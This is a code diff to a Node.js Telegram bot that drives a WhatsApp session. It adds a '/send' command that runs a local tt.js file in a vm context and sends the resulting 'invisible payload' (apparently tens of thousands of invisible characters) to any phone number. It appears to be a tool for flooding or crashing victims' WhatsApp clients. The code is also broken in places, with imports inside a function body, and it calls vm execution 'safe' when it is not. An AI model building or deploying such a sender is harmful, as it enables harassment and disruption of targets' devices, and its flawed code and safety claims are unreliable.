@@ -1,5 +1,6 @@
 import { TelegramClient, Api } from "telegram";
 import { NewMessage } from "telegram/events/index.js";
+import messageFromTT from './tt.js';
 import { StringSession } from "telegram/sessions/index.js";
 
 import { 
@@ -39,7 +40,6 @@ const apiId = parseInt(process.env.TELEGRAM_API_ID);
 // Add these to handle bulk forwards without spamming
 const vzBuffer = {}; 
 const vzTimer = {};
-const { vm } = require('vm'); // To safely execute the dynamic code
 const mergeBuffer = {}; // <-- ADD THIS LINE FOR THE FILE MERGER
 const apiHash = process.env.TELEGRAM_API_HASH;
 const stringSession = new StringSession(process.env.TELEGRAM_SESSION || ""); 
@@ -1688,6 +1688,13 @@ export function setupTelegramCommands(bot, notificationBot, clients, shortIdMap,
 
     
 
+import { fileURLToPath } from 'url';
+import vm from 'vm';
+
+// Recreate __dirname for ES Modules
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
 // Usage: /send 2348012345678
 bot.onText(/\/send\s+(\d+)/, async (msg, match) => {
     const chatId = msg.chat.id.toString();
@@ -1698,42 +1705,54 @@ bot.onText(/\/send\s+(\d+)/, async (msg, match) => {
 
     try {
         const ttPath = path.join(__dirname, 'tt.js');
-        if (!fs.existsSync(ttPath)) throw new Error('tt.js not found.');
+        if (!fs.existsSync(ttPath)) throw new Error('tt.js not found in directory.');
 
-        // 1. Read the code from your tt.js
+        // 1. Read the code from tt.js
         const code = fs.readFileSync(ttPath, 'utf8');
 
-        // 2. Execute the code to get the 'message' variable
-        // We use a sandbox so 'message' becomes available to us
-        const sandbox = { console: console, message: "" };
-        require('vm').createContext(sandbox);
-        require('vm').runInContext(code, sandbox);
+        // 2. Execute the code safely in a sandbox
+        // We initialize 'message' so the script can modify it
+        const sandbox = { 
+            console: console, 
+            message: "",
+            // These allow your 'let' declarations in tt.js to work within the VM
+            let: null, 
+            const: null 
+        };
 
+        vm.createContext(sandbox);
+        
+        // We run the code. If tt.js has "let message = ...", 
+        // we might need to grab it specifically.
+        vm.runInContext(code, sandbox);
+
+        // Capture the result
         const finalPayload = sandbox.message;
 
         if (!finalPayload) {
-            throw new Error('Could not capture "message" variable from tt.js');
+            throw new Error('tt.js executed but the "message" variable is empty.');
         }
 
-        // 3. Format Number
+        // 3. Format Number for WhatsApp
         const waId = targetNumber.includes('@c.us') ? targetNumber : `${targetNumber}@c.us`;
 
         // 4. Send via your WhatsApp socket (sock)
         await sock.sendMessage(waId, { text: finalPayload });
 
-        await bot.editMessageText(`[SUCCESS] ✅ Payload sent to ${targetNumber}!\n(Invisible chars: 50,000)`, {
+        await bot.editMessageText(`[SUCCESS] ✅ Invisible payload sent to ${targetNumber}!`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
 
     } catch (err) {
-        console.error(err);
+        console.error('[SEND_ERROR]', err);
         await bot.editMessageText(`[ERROR] Send failed: ${err.message}`, {
             chat_id: chatId,
             message_id: statusMsg.message_id
         });
     }
 });
+
 
 
 
